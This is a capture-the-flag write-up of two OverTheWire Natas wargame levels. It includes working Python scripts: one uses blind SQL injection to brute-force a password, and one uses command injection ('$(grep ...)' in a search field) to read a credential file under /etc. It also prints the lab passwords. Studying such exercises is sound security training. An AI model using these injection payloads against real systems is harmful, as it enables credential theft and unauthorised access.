# Level 15 - 16
Inspecting the code shows that there is no explicit way to get the password. So we have to use a blind SQLi to confirm the password character by character. 

We'll do this with a python script. The `requests` library to get it done, but how do we make our request pass the login that we had to do to get in here in the first place? Opening up Burp suite and looking in the headers of a HTTP request, we see that the site uses HTTP basic auth, which sends the current password in plaintext:

`Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==`

So, all we need to do is use a package to do the same. Fortunately, there is one that ships with `requests`! Now all we have to do is write our script guesses each character in the password by brute force by exploiting the query.

```python
import requests
from requests.auth import HTTPBasicAuth

user = "natas15"
pw = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

# Empty container for our final password
hacc = ""

# Set of all alphanumeric characters
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

while (len(hacc) < 32):
    for char in chars:
        exploit = {
            "username": f'natas16" AND password LIKE BINARY"{hacc + char}%'
        }
        print(exploit)
        r = requests.post('http://natas15.natas.labs.overthewire.org/?debug', data=exploit, auth=HTTPBasicAuth(user, pw))

        if 'exists' in r.text:
            hacc += char
            print(hacc)
            break
```

This works and obtains the password, but it's really slow. We are doing possibly 62 HTTP requests for each of the 32 characters in the password. Therefore we can speed it up by filtering out characters that don't exist in the password with a preliminary query loop. Of course, there are ways to do better:
- Divide and conquer the password guessing with a distributed algorithm
- "Split" the password in groups, allowing more filtering of the characters in each group

But they probably aren't worth the effort right now.


# Level 16 - 17
We've got another needle in a haystack exercise. However, this time we see that the characters we would usually use to escape the `grep` command have been blacklisted. Additionally, the `$key` is now surrounded by quotes and is purely a string.

```php
if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
} else {
    passthru("grep -i \"$key\" dictionary.txt");
}
```

We're restricted to using grep honestly: no shell escapes or searching multiple files. Fortunately, we have a way to inject raw terminal code into the substring that we are matching. Therefore if we search a very specific word in the dictionary, followed by our grep query, there will be no result if our grep query returned a line. An example is as follows:
```
Input: thumps
Output: thumps

Input: thumps$(grep a /etc/natas_webpass/natas17)
Output: thumps

Input: thumps$(grep b /etc/natas_webpass/natas17)
Output: 
```

So now we need to write a python script just like we did last time to do this brute force attack. First we use our query to get a list of all characters that exist in the password, and then we'll use grep with a regex match to get the exact password, all done using GET requests using the `requests` module with HTTP basic authentication.

```python
import requests
from requests.auth import HTTPBasicAuth

user = "natas16"
pw = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

# Empty container for our final password
hacc = ""

# Set of all alphanumeric characters
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
filtered = ""

for char in chars:
    exploit = {
        'needle': f'thumps$(grep {char} /etc/natas_webpass/natas17)'
    }
    r = requests.get('http://natas16.natas.labs.overthewire.org/', params=exploit, auth=HTTPBasicAuth(user, pw))
    if 'thumps' not in r.text:
        filtered += char
        print(filtered)

while (len(hacc) < 32):
    for char in filtered:
        exploit = {
            'needle': f'thumps$(grep ^{hacc + char} /etc/natas_webpass/natas17)'
        }
        r = requests.get('http://natas16.natas.labs.overthewire.org/', params=exploit, auth=HTTPBasicAuth(user, pw))

        if 'thumps' not in r.text:
            hacc += char
            print(hacc)
            break
```

